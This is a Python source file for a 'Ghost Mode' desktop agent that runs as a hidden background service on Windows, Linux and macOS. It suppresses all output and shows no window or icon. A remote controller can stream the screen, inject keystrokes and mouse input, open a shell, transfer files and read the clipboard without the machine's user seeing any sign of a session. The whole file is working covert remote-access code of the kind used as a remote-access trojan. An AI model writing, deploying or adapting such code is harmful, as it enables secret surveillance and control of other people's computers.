"""
agents/desktop_agent.py
-----------------------
Full-featured GHOST-MODE agent for Windows, Linux, and macOS desktops.

Ghost Mode means:
  - No GUI window, no popup, no taskbar icon
  - Runs as a background daemon / OS service
  - Session triggered remotely by the Controller via encrypted command
  - All stdout/stderr redirected to null (service log only)
  - Starts before user login when deployed via systemd / NSSM

Capabilities:
  ✓ Screen capture (MSS — cross-platform, low-latency)
  ✓ Mouse & keyboard injection (pynput)
  ✓ Pseudo-terminal (PTY / subprocess)
  ✓ File transfer (upload & download)
  ✓ Clipboard access
  ✓ System metrics

Deploy as a service (see service/ directory):
  Windows : nssm install NexusGhost python agents/desktop_agent.py ...
  Linux   : systemctl enable nexus-ghost

Direct run (dev only):
    python -m agents.desktop_agent \
        --relay wss://your-relay:7000 \
        --device-id my-desktop \
        --token YOUR_AGENT_TOKEN \
        --ghost          # suppresses all console output
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# GHOST MODE: silence ALL output before ANY other import
# When deployed as a service these handles are already null;
# this guard ensures silent operation even when run directly.
# ---------------------------------------------------------------------------
import os
import sys

_GHOST_MODE: bool = "--ghost" in sys.argv or os.environ.get("NEXUS_GHOST", "0") == "1"

if _GHOST_MODE:
    _devnull = open(os.devnull, "w")
    sys.stdout = _devnull
    sys.stderr = _devnull

# ---------------------------------------------------------------------------
# Standard imports (after silencing)
# ---------------------------------------------------------------------------
import asyncio
import io
import logging
import platform
import uuid
from pathlib import Path
from typing import Any, Dict, List, Optional

# ---------------------------------------------------------------------------
# Ghost-mode logging: file only, never console
# ---------------------------------------------------------------------------
_LOG_DIR = Path.home() / ".nexus"
_LOG_DIR.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    filename=str(_LOG_DIR / "agent.log"),
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)

from agents.base_agent import BaseAgent
from core.registry import DeviceCapabilities, DeviceType
from core.session import MessageType
from config.settings import settings
from utils.logger import AuditLogger, get_logger

log = get_logger("nexus.agent.desktop")
audit = AuditLogger(settings.log.audit_file)

# ---------------------------------------------------------------------------
# Optional capability imports — gracefully degrade
# ---------------------------------------------------------------------------
try:
    import mss
    import mss.tools
    _HAS_MSS = True
except ImportError:
    _HAS_MSS = False
    logging.warning("mss not installed — screen capture unavailable")

try:
    from PIL import Image
    _HAS_PIL = True
except ImportError:
    _HAS_PIL = False

try:
    from pynput import keyboard as _kb, mouse as _mouse
    _HAS_PYNPUT = True
except ImportError:
    _HAS_PYNPUT = False
    logging.warning("pynput not installed — input injection unavailable")


class DesktopAgent(BaseAgent):
    """
    Full desktop remote-access agent running in Ghost Mode.

    Session lifecycle (Ghost Mode):
      1. Agent starts silently as a system service.
      2. Connects to Relay, authenticates, enters IDLE state.
      3. Controller sends `session.request` → ECDH handshake.
      4. Session goes ACTIVE: screen stream + input injection begin.
      5. Controller sends `session.close` or drops → agent returns to IDLE.
      6. No GUI interaction at any point.
    """

    def __init__(
        self,
        relay_url: str,
        device_id: str,
        device_name: str,
        agent_token: str,
        ghost_mode: bool = False,
    ):
        super().__init__(relay_url, device_id, device_name, agent_token)
        self._ghost_mode = ghost_mode or _GHOST_MODE
        self._sct = None                          # MSS context (lazy-init per session)
        self._terminals: Dict[str, asyncio.subprocess.Process] = {}
        self._keyboard_ctrl = None
        self._mouse_ctrl = None
        self._screen_task: Optional[asyncio.Task] = None
        self._session_active = False

        if _HAS_PYNPUT:
            self._keyboard_ctrl = _kb.Controller()
            self._mouse_ctrl = _mouse.Controller()

    # ------------------------------------------------------------------
    # BaseAgent abstract impl
    # ------------------------------------------------------------------

    @property
    def device_type(self) -> DeviceType:
        return DeviceType.DESKTOP

    def get_capabilities(self) -> DeviceCapabilities:
        return DeviceCapabilities(
            screen_share=_HAS_MSS,
            remote_input=_HAS_PYNPUT,
            file_transfer=True,
            terminal=True,
            clipboard=True,
            audio=False,
            metrics=True,
        )

    # ------------------------------------------------------------------
    # Session lifecycle hooks (called by BaseAgent)
    # ------------------------------------------------------------------

    async def on_session_start(self) -> None:
        """Called when ECDH handshake completes and session goes ACTIVE."""
        self._session_active = True
        logging.info(f"Ghost session started: {self._current_session_id}")
        if _HAS_MSS:
            self._screen_task = asyncio.create_task(self._screen_push_loop())

    async def on_session_end(self) -> None:
        """Called when session closes for any reason."""
        self._session_active = False
        if self._screen_task:
            self._screen_task.cancel()
            self._screen_task = None
        # Clean up MSS context so it can reinitialise next session
        if self._sct:
            try:
                self._sct.close()
            except Exception:
                pass
            self._sct = None
        logging.info("Ghost session ended")

    # ------------------------------------------------------------------
    # Screen — PUSH mode (agent drives frame rate)
    # ------------------------------------------------------------------

    async def _screen_push_loop(self) -> None:
        """
        Continuously capture and push frames at the configured FPS.
        Ghost Mode: no window, no preview — raw bytes straight to network.
        """
        interval = 1.0 / max(1, settings.agent.screen_fps)
        while self._session_active:
            try:
                frame = await asyncio.get_event_loop().run_in_executor(
                    None, self._capture_screen
                )
                if frame:
                    await self._send_session(
                        MessageType.SCREEN_FRAME, {"frame": frame.hex()}
                    )
                await asyncio.sleep(interval)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logging.error(f"Screen push error: {e}")
                await asyncio.sleep(1)

    async def on_screen_request(self) -> Optional[bytes]:
        """Pull-mode: controller explicitly requested one frame."""
        if not _HAS_MSS:
            return None
        return await asyncio.get_event_loop().run_in_executor(None, self._capture_screen)

    def _capture_screen(self) -> bytes:
        try:
            if self._sct is None:
                self._sct = mss.mss()
            monitor = self._sct.monitors[1]
            shot = self._sct.grab(monitor)

            if _HAS_PIL:
                img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                scale = settings.agent.screen_scale
                if scale != 1.0:
                    img = img.resize(
                        (int(img.width * scale), int(img.height * scale)),
                        Image.LANCZOS,
                    )
                buf = io.BytesIO()
                img.save(buf, format="JPEG", quality=settings.agent.screen_quality)
                return buf.getvalue()
            return mss.tools.to_png(shot.rgb, shot.size)
        except Exception as e:
            logging.error(f"Screen capture failed: {e}")
            return b""

    # ------------------------------------------------------------------
    # Mouse & keyboard injection
    # ------------------------------------------------------------------

    async def on_mouse_event(self, payload: Dict[str, Any]) -> None:
        if not _HAS_PYNPUT or not self._mouse_ctrl:
            return
        await asyncio.get_event_loop().run_in_executor(None, self._inject_mouse, payload)

    def _inject_mouse(self, p: Dict[str, Any]) -> None:
        try:
            action = p.get("action")
            x, y = p.get("x", 0), p.get("y", 0)
            self._mouse_ctrl.position = (x, y)
            if action == "move":
                return
            if action == "click":
                btn_map = {
                    "left": _mouse.Button.left,
                    "right": _mouse.Button.right,
                    "middle": _mouse.Button.middle,
                }
                btn = btn_map.get(p.get("button", "left"), _mouse.Button.left)
                self._mouse_ctrl.click(btn, p.get("count", 1))
            elif action == "scroll":
                self._mouse_ctrl.scroll(p.get("dx", 0), p.get("dy", 0))
            elif action == "press":
                btn = _mouse.Button.left if p.get("button") != "right" else _mouse.Button.right
                self._mouse_ctrl.press(btn)
            elif action == "release":
                btn = _mouse.Button.left if p.get("button") != "right" else _mouse.Button.right
                self._mouse_ctrl.release(btn)
        except Exception as e:
            logging.error(f"Mouse inject error: {e}")

    async def on_key_event(self, payload: Dict[str, Any]) -> None:
        if not _HAS_PYNPUT or not self._keyboard_ctrl:
            return
        await asyncio.get_event_loop().run_in_executor(None, self._inject_key, payload)

    def _inject_key(self, p: Dict[str, Any]) -> None:
        try:
            action = p.get("action")
            key_str = p.get("key", "")

            if action == "type":
                self._keyboard_ctrl.type(key_str)
                return

            key = key_str if len(key_str) == 1 else getattr(
                _kb.Key, key_str.lower(), key_str
            )
            if action == "press":
                self._keyboard_ctrl.press(key)
            elif action == "release":
                self._keyboard_ctrl.release(key)
            elif action == "tap":
                self._keyboard_ctrl.press(key)
                self._keyboard_ctrl.release(key)
        except Exception as e:
            logging.error(f"Key inject error: {e}")

    # ------------------------------------------------------------------
    # Terminal
    # ------------------------------------------------------------------

    async def on_terminal_open(self, terminal_id: str) -> bool:
        try:
            shell = self._get_shell()
            proc = await asyncio.create_subprocess_shell(
                shell,
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                env={**os.environ, "TERM": "xterm-256color"},
            )
            self._terminals[terminal_id] = proc
            logging.info(f"Terminal opened: {terminal_id} PID={proc.pid}")
            asyncio.create_task(self._drain_terminal(terminal_id, proc))
            return True
        except Exception as e:
            logging.error(f"Terminal open failed: {e}")
            return False

    async def _drain_terminal(
        self, terminal_id: str, proc: asyncio.subprocess.Process
    ) -> None:
        while proc.returncode is None:
            try:
                data = await asyncio.wait_for(proc.stdout.read(4096), timeout=0.1)
                if data:
                    await self._send_session(
                        MessageType.TERMINAL_DATA,
                        {
                            "terminal_id": terminal_id,
                            "data": data.decode("utf-8", errors="replace"),
                        },
                    )
            except asyncio.TimeoutError:
                continue
            except Exception:
                break
        logging.info(f"Terminal exited: {terminal_id} rc={proc.returncode}")

    async def on_terminal_data(self, terminal_id: str, data: str) -> Optional[bytes]:
        proc = self._terminals.get(terminal_id)
        if proc and proc.stdin and not proc.stdin.is_closing():
            try:
                proc.stdin.write(data.encode())
                await proc.stdin.drain()
            except Exception as e:
                logging.warning(f"Terminal write error: {e}")
        return None

    async def on_terminal_close(self, terminal_id: str) -> None:
        proc = self._terminals.pop(terminal_id, None)
        if proc:
            try:
                proc.terminate()
                await asyncio.wait_for(proc.wait(), timeout=3.0)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        logging.info(f"Terminal closed: {terminal_id}")

    def _get_shell(self) -> str:
        if platform.system() == "Windows":
            return "powershell.exe -NoProfile -NonInteractive"
        return os.environ.get("SHELL", "/bin/bash")

    # ------------------------------------------------------------------
    # File operations
    # ------------------------------------------------------------------

    async def on_file_list(self, path: str) -> List[dict]:
        p = Path(path).expanduser().resolve()
        if not p.exists():
            return []
        entries = []
        try:
            for item in p.iterdir():
                try:
                    stat = item.stat()
                    entries.append(
                        {
                            "name": item.name,
                            "path": str(item),
                            "is_dir": item.is_dir(),
                            "size": stat.st_size,
                            "modified": stat.st_mtime,
                            "permissions": oct(stat.st_mode)[-3:],
                        }
                    )
                except PermissionError:
                    pass
        except PermissionError:
            pass
        return sorted(entries, key=lambda e: (not e["is_dir"], e["name"].lower()))

    async def on_file_download(self, path: str) -> Optional[bytes]:
        p = Path(path).expanduser().resolve()
        if not p.is_file():
            return None
        size_mb = p.stat().st_size / (1024 * 1024)
        if size_mb > settings.agent.max_transfer_mb:
            logging.warning(f"File too large for transfer: {path} ({size_mb:.1f} MB)")
            return None
        return p.read_bytes()

    async def on_file_upload(self, path: str, data: bytes) -> bool:
        p = Path(path).expanduser()
        try:
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(data)
            audit.file_transfer(
                session_id=self._current_session_id or "unknown",
                direction="upload",
                filename=p.name,
                size_bytes=len(data),
            )
            return True
        except Exception as e:
            logging.error(f"File upload failed: {e}")
            return False

    # ------------------------------------------------------------------
    # Clipboard
    # ------------------------------------------------------------------

    async def on_clipboard_get(self) -> Optional[str]:
        return await asyncio.get_event_loop().run_in_executor(
            None, self._read_clipboard
        )

    async def on_clipboard_set(self, text: str) -> None:
        await asyncio.get_event_loop().run_in_executor(
            None, self._write_clipboard, text
        )

    def _read_clipboard(self) -> Optional[str]:
        try:
            if platform.system() == "Windows":
                import ctypes
                CF_UNICODETEXT = 13
                ctypes.windll.user32.OpenClipboard(0)
                handle = ctypes.windll.user32.GetClipboardData(CF_UNICODETEXT)
                result = ctypes.c_wchar_p(handle).value
                ctypes.windll.user32.CloseClipboard()
                return result
            elif platform.system() == "Darwin":
                import subprocess
                return subprocess.check_output(["pbpaste"]).decode()
            else:
                import subprocess
                for tool in [["xclip", "-o", "-selection", "clipboard"], ["xsel", "--clipboard", "--output"]]:
                    try:
                        return subprocess.check_output(tool, stderr=subprocess.DEVNULL).decode()
                    except FileNotFoundError:
                        continue
        except Exception as e:
            logging.warning(f"Clipboard read error: {e}")
        return None

    def _write_clipboard(self, text: str) -> None:
        try:
            if platform.system() == "Darwin":
                import subprocess
                proc = subprocess.Popen(["pbcopy"], stdin=subprocess.PIPE)
                proc.communicate(text.encode())
            elif platform.system() != "Windows":
                import subprocess
                for tool in [["xclip", "-selection", "clipboard"], ["xsel", "--clipboard", "--input"]]:
                    try:
                        proc = subprocess.Popen(tool, stdin=subprocess.PIPE, stderr=subprocess.DEVNULL)
                        proc.communicate(text.encode())
                        return
                    except FileNotFoundError:
                        continue
        except Exception as e:
            logging.warning(f"Clipboard write error: {e}")


# ---------------------------------------------------------------------------
# CLI entrypoint
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="NEXUS Desktop Agent")
    parser.add_argument("--relay", required=True, help="Relay WebSocket URL wss://host:port")
    parser.add_argument("--device-id", default=str(uuid.uuid4()))
    parser.add_argument("--name", default=platform.node())
    parser.add_argument("--token", required=True, help="Agent registration token")
    parser.add_argument(
        "--ghost",
        action="store_true",
        help="Ghost mode: suppress all console output (use when running as a service)",
    )
    args = parser.parse_args()

    agent = DesktopAgent(
        relay_url=args.relay,
        device_id=args.device_id,
        device_name=args.name,
        agent_token=args.token,
        ghost_mode=args.ghost,
    )
    asyncio.run(agent.run())
